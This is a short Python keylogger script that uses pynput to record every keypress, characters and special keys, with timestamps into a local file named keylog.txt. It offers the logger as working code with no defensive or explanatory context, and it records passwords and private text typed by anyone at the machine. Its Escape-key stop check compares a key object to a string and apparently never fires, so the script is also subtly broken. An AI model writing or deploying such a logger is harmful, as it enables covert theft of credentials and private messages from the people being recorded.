from pynput.keyboard import Listener
import logging

# Setting up logging to store the keystrokes in a file
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        # Log the key that was pressed
        logging.info(f'{key.char}')  # For normal character keys
    except AttributeError:
        # Handle special keys like space, enter, etc.
        logging.info(f'[{key}]')  # Special keys

def on_release(key):
    if key == 'Key.esc':  # Stop the listener when Escape key is pressed
        return False

# Collecting keystrokes
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
